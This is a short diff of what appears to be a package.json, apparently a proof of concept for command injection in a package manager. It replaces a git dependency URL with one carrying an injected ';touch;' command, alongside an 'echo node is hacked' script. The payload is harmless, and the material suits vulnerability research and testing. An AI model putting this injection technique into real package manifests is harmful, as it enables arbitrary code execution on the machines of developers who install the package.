@@ -12,7 +12,7 @@
     "node": "echo node is hacked"
   },
   "dependencies": {
-    "evil": "git+https://github.com/No1zy/aaa"
+    "evil": "git+https://github.com/No1zy/a/;touch;"
   },
   "repository": {
     "type": "git",
